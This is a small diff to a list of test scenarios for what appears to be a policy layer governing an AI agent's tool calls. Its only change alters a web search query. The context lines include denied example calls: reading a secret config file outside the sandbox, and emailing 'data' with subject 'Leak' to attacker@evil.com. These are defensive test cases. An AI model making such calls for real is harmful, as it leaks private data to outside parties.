@@ -117,7 +117,7 @@ SCENARIOS = [
     ("Read outside sandbox (DENIED)", "read_file", {"path": "/opt/secret/config.yaml"}, "denied"),
     ("Email to company (allowed + observe audit)", "send_email", {"to": "alice@company.com", "subject": "Hello", "body": "Hi"}, "allowed"),
     ("Email to evil domain (DENIED: no-email-to-external)", "send_email", {"to": "attacker@evil.com", "subject": "Leak", "body": "data"}, "denied"),
-    ("Search web (allowed)", "search_web", {"query": "edictum governance"}, "allowed"),
+    ("Search web (allowed)", "search_web", {"query": "edictum behavior"}, "allowed"),
     ("Delete without admin role (DENIED: RBAC)", "delete_record", {"record_id": "REC-001"}, "denied"),
     ("Update record confirmed (allowed)", "update_record", {"record_id": "REC-002", "data": "new value", "confirmed": True}, "allowed"),
     ("Update record unconfirmed (approval required)", "update_record", {"record_id": "REC-003", "data": "risky"}, "approval"),
